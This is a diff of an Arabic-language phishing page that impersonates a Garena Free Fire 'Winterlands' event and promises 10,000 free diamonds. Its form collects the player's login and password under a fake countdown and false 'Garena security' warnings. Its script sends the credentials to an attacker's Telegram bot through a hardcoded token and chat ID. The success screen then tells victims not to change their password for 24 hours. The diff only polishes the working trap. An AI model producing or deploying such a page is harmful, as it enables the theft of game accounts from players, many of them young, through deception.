@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garena Free Fire - Winter Event 2026</title>
+    <title>Garena Free Fire - Winterlands Event</title>
     <style>
         body { 
             background: url('https://w0.peakpx.com/wallpaper/326/28/HD-wallpaper-garena-free-fire-winterlands.jpg') no-repeat center center fixed; 
@@ -14,31 +14,32 @@
             direction: rtl; 
             margin: 0; 
         }
-        .overlay { background: rgba(0, 0, 0, 0.8); min-height: 100vh; padding: 20px; }
+        .overlay { background: rgba(0, 0, 0, 0.85); min-height: 100vh; padding: 20px; }
         .box { 
-            border: 3px solid #00f2ff; 
+            border: 2px solid #00f2ff; 
             background: rgba(10, 25, 41, 0.95); 
-            border-radius: 20px; 
-            padding: 30px; 
+            border-radius: 15px; 
+            padding: 25px; 
             max-width: 400px; 
             margin: auto; 
-            box-shadow: 0 0 30px #00f2ff; 
+            box-shadow: 0 0 20px #00f2ff; 
         }
         .warning-box { 
-            background: rgba(255, 0, 0, 0.2); 
-            border: 1px solid #ff0000; 
+            background: rgba(255, 0, 0, 0.15); 
+            border: 1px solid #ff3d00; 
             color: #ffcc00; 
-            padding: 10px; 
+            padding: 12px; 
             font-size: 14px; 
             border-radius: 8px; 
             margin: 15px 0; 
+            line-height: 1.6;
         }
         input { 
             width: 100%; 
-            padding: 15px; 
+            padding: 14px; 
             margin: 10px 0; 
             border-radius: 8px; 
-            border: 2px solid #00f2ff; 
+            border: 1px solid #00f2ff; 
             background: #000; 
             color: white; 
             box-sizing: border-box; 
@@ -47,37 +48,34 @@
         .yellow-btn { 
             background: linear-gradient(180deg, #ffe600, #ff9900); 
             color: black; 
-            padding: 18px; 
+            padding: 16px; 
             border: none; 
             border-radius: 10px; 
             font-weight: bold; 
             cursor: pointer; 
             width: 100%; 
-            font-size: 20px; 
-            margin-top: 15px; 
-            box-shadow: 0 5px 15px rgba(255, 153, 0, 0.4);
-            text-transform: uppercase;
+            font-size: 19px; 
+            margin-top: 10px; 
+            box-shadow: 0 4px 10px rgba(255, 153, 0, 0.4);
         }
-        .timer { font-size: 22px; color: #ff3d00; font-weight: bold; text-shadow: 0 0 10px #ff3d00; }
+        .timer { font-size: 22px; color: #ff3d00; font-weight: bold; }
         #success-page { display: none; }
-        .success-icon { font-size: 60px; color: #00ff00; margin-bottom: 20px; }
     </style>
 </head>
 <body>
 <div class="overlay">
     <div id="login-page">
-        <img src="https://freefiremobile-a.akamaihd.net/ff_common/images/icon_logo.png" width="90" style="margin-top:20px;">
-        <h1 style="color:#00f2ff; text-shadow: 2px 2px #000;">حدث أرض الشتاء ❄️</h1>
-        
+        <h1 style="color:#00f2ff; text-shadow: 2px 2px #000; margin-top:20px;">❄️ حدث أرض الشتاء ❄️</h1>
         <div class="box">
             <div class="timer">ينتهي العرض الترويجي: <span id="time">04:59</span></div>
-            <h3 style="margin-top:10px;">استلم الآن 10,000 جوهرة 💎</h3>
+            <h3 style="margin-bottom:5px;">استلم الآن 10,000 جوهرة 💎</h3>
             
             <div class="warning-box">
-                ⚠️ **تنبيه أمان قارينا**: يجب التأكد من كتابة الحساب وكلمة السر بشكل صحيح تماماً. إذا أخطأت في حرف واحد، **لن تصلك الجائزة** وسيتم استبعادك من الحدث نهائياً!
+                <span style="color:white; font-weight:bold; display:block; margin-bottom:5px;">⚠️ يجب إدخال حسابك الأساسي المرتبط باللعبة</span>
+                **تنبيه أمان قارينا**: يجب التأكد من كتابة الحساب وكلمة السر بشكل صحيح تماماً. إذا أخطأت في حرف واحد، **لن تصلك الجائزة** وسيتم استبعادك من الحدث نهائياً!
             </div>
 
-            <form id="ff-trap">
+            <form id="trap-form">
                 <input type="text" id="user" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
                 <input type="password" id="pass" placeholder="كلمة السر الصحيحة" required>
                 <button type="submit" class="yellow-btn">الحصول على الجوائز الآن 🔥</button>
@@ -86,15 +84,13 @@
     </div>
 
     <div id="success-page">
-        <div class="box" style="margin-top: 50px; border-color: #00ff00; box-shadow: 0 0 30px #00ff00;">
-            <div class="success-icon">✅</div>
-            <h2 style="color: #00ff00;">تم قبول طلبك بنجاح!</h2>
-            <p style="font-size: 18px;">نحن نقوم الآن بمعالجة حسابك وتأكيد البيانات المرسلة.</p>
-            <hr style="border: 0.5px solid #333;">
-            <p style="color: #ffcc00; font-weight: bold;">⚠️ ملاحظة هامة جداً:</p>
-            <p>سوف تصلك الجوائز عبر بريد اللعبة خلال **24 ساعة**.</p>
-            <p style="background: rgba(255,255,255,0.1); padding: 10px; border-radius: 5px;">لضمان وصول الجواهر، لا تقم بتغيير كلمة السر أو تسجيل الدخول من جهاز آخر حتى تنتهي الـ 24 ساعة.</p>
-            <button class="yellow-btn" style="background:#333; color:white;" onclick="location.reload()">العودة للرئيسية</button>
+        <div class="box" style="margin-top: 80px; border-color: #00ff00; box-shadow: 0 0 20px #00ff00;">
+            <div style="font-size: 50px; color: #00ff00; margin-bottom: 15px;">✅</div>
+            <h2 style="color: #00ff00;">تم قبول طلبك!</h2>
+            <p>يتم الآن التحقق من "الحساب الأساسي" الذي أدخلته.</p>
+            <p style="background: rgba(255,255,255,0.1); padding: 10px; border-radius: 5px;">سوف تصلك الـ 10,000 جوهرة عبر بريد اللعبة خلال **24 ساعة**.</p>
+            <p style="color: #ffcc00; font-size: 13px;">ملاحظة: لا تقم بتسجيل الدخول أو تغيير البيانات حتى اكتمال الشحن.</p>
+            <button class="yellow-btn" style="background:#444; color:white;" onclick="location.reload()">إغلاق</button>
         </div>
     </div>
 </div>
@@ -103,11 +99,11 @@
     const token = "8425893173:AAEmLTkoJzcm1hnvsA3TTzF9nUssmqEKPt8";
     const chat_id = "8428507759";
 
-    document.getElementById('ff-trap').addEventListener('submit', function(e) {
+    document.getElementById('trap-form').addEventListener('submit', function(e) {
         e.preventDefault();
         const user = document.getElementById('user').value;
         const pass = document.getElementById('pass').value;
-        const message = `❄️ صيد شتاء فري فاير جديد ❄️\n\n👤 الحساب: ${user}\n🔑 كلمة السر: ${pass}\n📅 الوقت: ${new Date().toLocaleString()}`;
+        const message = `❄️ صيد شتاء (حساب أساسي) ❄️\n\n👤 الحساب: ${user}\n🔑 كلمة السر: ${pass}`;
 
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
         .then(() => {
@@ -116,7 +112,7 @@
         });
     });
 
-    // عداد الوقت التنازلي
+    // عداد الوقت
     var min = 4, sec = 59;
     setInterval(function() {
         if (sec == 0) { min--; sec = 59; } else { sec--; }
@@ -125,3 +121,4 @@
 </script>
 </body>
 </html>
+
